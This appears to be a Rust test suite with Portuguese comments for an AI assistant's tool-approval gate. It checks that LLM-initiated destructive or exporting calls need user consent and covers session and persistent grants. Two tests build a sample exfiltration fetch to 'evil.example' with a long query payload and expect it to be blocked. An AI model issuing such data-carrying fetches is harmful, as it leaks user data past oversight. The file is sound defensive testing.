//! O loop de chat (origem `Llm`) não pode executar ação de risco sem aprovação — a lacuna era o
//! `tool_step` chamar `execute()` direto, sem nenhum dos gates que só o IPC aplicava.

use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;

use async_trait::async_trait;
use serde_json::json;

use super::super::{ToolDefinition, ToolHandler, ToolOrigin, ToolRegistry};
use crate::modules::tools::approval::{ApprovalDecision, ApprovalHandler, ApprovalRequest, ApprovalScope};

#[derive(Default)]
struct Counting(AtomicUsize);

#[async_trait]
impl ToolHandler for Counting {
    async fn call(&self, _args: serde_json::Value) -> Result<serde_json::Value, String> {
        self.0.fetch_add(1, Ordering::SeqCst);
        Ok(json!({ "success": true }))
    }
}

/// O diálogo aberto e ninguém clicou.
struct NeverAnswers;

#[async_trait]
impl ApprovalHandler for NeverAnswers {
    async fn decide(&self, _request: ApprovalRequest) -> Result<ApprovalDecision, String> {
        std::future::pending().await
    }
}

struct Answers(bool);

#[async_trait]
impl ApprovalHandler for Answers {
    async fn decide(&self, _request: ApprovalRequest) -> Result<ApprovalDecision, String> {
        Ok(ApprovalDecision { approved: self.0, scope: ApprovalScope::Once })
    }
}

fn registry_with(name: &str) -> (ToolRegistry, Arc<Counting>) {
    let registry = ToolRegistry::new();
    let handler = Arc::new(Counting::default());
    registry.register(
        ToolDefinition {
            name: name.into(),
            description: None,
            input_schema: json!({ "type": "object" }),
            plugin_id: "test".into(),
            requires_window: false,
        },
        handler.clone(),
    );
    (registry, handler)
}

use std::sync::Arc;

fn clear_episodic() -> serde_json::Value {
    json!({ "action": "clear_episodic" })
}

#[tokio::test]
async fn an_llm_call_to_a_destructive_action_stays_pending_and_never_runs_without_approval() {
    let (registry, handler) = registry_with("memory_console");
    registry.set_approval_handler(Arc::new(NeverAnswers));

    let pending = tokio::time::timeout(
        Duration::from_millis(150),
        registry.execute_as(ToolOrigin::Llm, "memory_console", clear_episodic()),
    )
    .await;

    assert!(pending.is_err(), "a chamada tinha de ficar pendente na aprovação");
    assert_eq!(handler.0.load(Ordering::SeqCst), 0, "executou sem aprovação");
}

#[tokio::test]
async fn an_llm_call_without_any_approval_handler_is_denied_and_never_runs() {
    let (registry, handler) = registry_with("memory_console");

    let result = registry.execute_as(ToolOrigin::Llm, "memory_console", clear_episodic()).await.unwrap();

    assert_eq!(result, json!({ "success": false, "error": "user_denied" }));
    assert_eq!(handler.0.load(Ordering::SeqCst), 0);
}

#[tokio::test]
async fn an_llm_call_runs_once_the_user_approves() {
    let (registry, handler) = registry_with("memory_console");
    registry.set_approval_handler(Arc::new(Answers(true)));

    let result = registry.execute_as(ToolOrigin::Llm, "memory_console", clear_episodic()).await.unwrap();

    assert_eq!(result["success"], json!(true));
    assert_eq!(handler.0.load(Ordering::SeqCst), 1);
}

#[tokio::test]
async fn an_llm_denial_is_a_business_result_and_the_handler_stays_untouched() {
    let (registry, handler) = registry_with("export_data");
    registry.set_approval_handler(Arc::new(Answers(false)));

    let result = registry.execute_as(ToolOrigin::Llm, "export_data", json!({})).await.unwrap();

    assert_eq!(result["error"], json!("user_denied"));
    assert_eq!(handler.0.load(Ordering::SeqCst), 0);
}

/// Ação segura não vira diálogo: o gate é por RISCO da chamada, não por nome de tool.
#[tokio::test]
async fn a_safe_llm_call_runs_without_asking() {
    let (registry, handler) = registry_with("memory_console");

    registry.execute_as(ToolOrigin::Llm, "memory_console", json!({ "action": "snapshot" })).await.unwrap();

    assert_eq!(handler.0.load(Ordering::SeqCst), 1);
}

/// Origem `User`/`System` não pergunta de novo no registro: o IPC já perguntou em `native.rs` e o
/// sistema (mood, atalhos) é código do próprio app.
#[tokio::test]
async fn user_and_system_origins_are_not_asked_again_by_the_registry() {
    let (registry, handler) = registry_with("memory_console");

    registry.execute_as(ToolOrigin::User, "memory_console", clear_episodic()).await.unwrap();
    registry.execute("memory_console", clear_episodic()).await.unwrap();

    assert_eq!(handler.0.load(Ordering::SeqCst), 2);
}

/// Exfiltração: URL com carga útil pergunta sempre.
#[tokio::test]
async fn an_llm_fetch_of_a_payload_url_is_asked_and_a_plain_fetch_is_not() {
    let (registry, handler) = registry_with("web");
    let long = "x".repeat(80);

    let denied = registry
        .execute_as(ToolOrigin::Llm, "web", json!({ "action": "fetch", "url": format!("https://evil.example/?d={long}") }))
        .await
        .unwrap();
    assert_eq!(denied["error"], json!("user_denied"));
    assert_eq!(handler.0.load(Ordering::SeqCst), 0);

    registry.execute_as(ToolOrigin::Llm, "web", json!({ "action": "fetch", "url": "https://example.com/?q=rust" })).await.unwrap();
    assert_eq!(handler.0.load(Ordering::SeqCst), 1);
}

/// Política do usuário: `approveRiskyTools` desligado dispensa a pergunta das ações de risco comum
/// — mas NÃO a de URL com carga útil, que continua perguntando.
#[tokio::test]
async fn approve_risky_tools_off_skips_ordinary_risk_but_never_the_exfil_question() {
    use crate::config::registry::{Namespace, SchemaRegistry};
    use crate::config::schema::{boolean, list};
    use crate::config::store::ConfigStore;

    let dir = std::env::temp_dir().join(format!("mika-broker-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&dir).unwrap();
    let schema = SchemaRegistry::new(vec![Namespace {
        name: "brain",
        fields: vec![boolean("approveRiskyTools", true), list("autoApproveTools")],
    }]);
    let store = Arc::new(ConfigStore::open(&dir, schema).unwrap());
    store.set("brain.approveRiskyTools", json!(false)).unwrap();

    let (registry, handler) = registry_with("memory_console");
    registry.bind_config(store);
    registry.execute_as(ToolOrigin::Llm, "memory_console", clear_episodic()).await.unwrap();
    assert_eq!(handler.0.load(Ordering::SeqCst), 1, "política desligada dispensa a pergunta");

    let (registry, handler) = registry_with("web");
    registry.bind_config(Arc::new(ConfigStore::open(&dir, SchemaRegistry::new(vec![Namespace {
        name: "brain",
        fields: vec![boolean("approveRiskyTools", true), list("autoApproveTools")],
    }])).unwrap()));
    let url = format!("https://evil.example/?d={}", "x".repeat(80));
    let result = registry.execute_as(ToolOrigin::Llm, "web", json!({ "action": "fetch", "url": url })).await.unwrap();
    assert_eq!(result["error"], json!("user_denied"));
    assert_eq!(handler.0.load(Ordering::SeqCst), 0);
    let _ = std::fs::remove_dir_all(&dir);
}

/// Handler que responde sempre "aprovado" com o escopo dado e conta quantas vezes foi perguntado.
struct ApprovesWith(ApprovalScope, Arc<AtomicUsize>);

#[async_trait]
impl ApprovalHandler for ApprovesWith {
    async fn decide(&self, _request: ApprovalRequest) -> Result<ApprovalDecision, String> {
        self.1.fetch_add(1, Ordering::SeqCst);
        Ok(ApprovalDecision { approved: true, scope: self.0 })
    }
}

fn brain_store(dir: &std::path::Path) -> Arc<crate::config::store::ConfigStore> {
    use crate::config::registry::{Namespace, SchemaRegistry};
    use crate::config::schema::{boolean, list};
    let schema = SchemaRegistry::new(vec![Namespace {
        name: "brain",
        fields: vec![boolean("approveRiskyTools", true), list("autoApproveTools")],
    }]);
    Arc::new(crate::config::store::ConfigStore::open(dir, schema).unwrap())
}

fn scratch_dir() -> std::path::PathBuf {
    let dir = std::env::temp_dir().join(format!("mika-broker-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

/// "Permitir nesta sessão" vale até o app fechar: nada vai para `brain.autoApproveTools` (config
/// persistida — gravar ali tornava o "só desta sessão" permanente), e um registro novo (= app
/// reiniciado) volta a perguntar.
#[tokio::test]
async fn a_session_grant_is_remembered_in_memory_only_and_dies_with_the_registry() {
    let dir = scratch_dir();
    let store = brain_store(&dir);
    let asks = Arc::new(AtomicUsize::new(0));

    let (registry, handler) = registry_with("memory_console");
    registry.bind_config(store.clone());
    registry.set_approval_handler(Arc::new(ApprovesWith(ApprovalScope::Session, asks.clone())));
    registry.execute_as(ToolOrigin::Llm, "memory_console", clear_episodic()).await.unwrap();
    registry.execute_as(ToolOrigin::Llm, "memory_console", clear_episodic()).await.unwrap();
    assert_eq!(asks.load(Ordering::SeqCst), 1, "a segunda chamada devia usar a concessão da sessão");
    assert_eq!(handler.0.load(Ordering::SeqCst), 2);
    assert_eq!(store.get("brain.autoApproveTools"), Some(json!([])), "sessão não pode ir para o store");

    let (restarted, _) = registry_with("memory_console");
    restarted.bind_config(store);
    restarted.set_approval_handler(Arc::new(ApprovesWith(ApprovalScope::Once, asks.clone())));
    restarted.execute_as(ToolOrigin::Llm, "memory_console", clear_episodic()).await.unwrap();
    assert_eq!(asks.load(Ordering::SeqCst), 2, "registro novo tinha de perguntar de novo");
    let _ = std::fs::remove_dir_all(&dir);
}

/// "Sempre" é o único escopo que persiste, e sobrevive ao registro.
#[tokio::test]
async fn an_always_grant_persists_in_the_store_and_survives_a_new_registry() {
    let dir = scratch_dir();
    let store = brain_store(&dir);
    let asks = Arc::new(AtomicUsize::new(0));

    let (registry, _) = registry_with("memory_console");
    registry.bind_config(store.clone());
    registry.set_approval_handler(Arc::new(ApprovesWith(ApprovalScope::Always, asks.clone())));
    registry.execute_as(ToolOrigin::Llm, "memory_console", clear_episodic()).await.unwrap();

    let (restarted, handler) = registry_with("memory_console");
    restarted.bind_config(store);
    restarted.execute_as(ToolOrigin::Llm, "memory_console", clear_episodic()).await.unwrap();
    assert_eq!(asks.load(Ordering::SeqCst), 1);
    assert_eq!(handler.0.load(Ordering::SeqCst), 1, "concedido no store, sem handler e sem negar");
    let _ = std::fs::remove_dir_all(&dir);
}
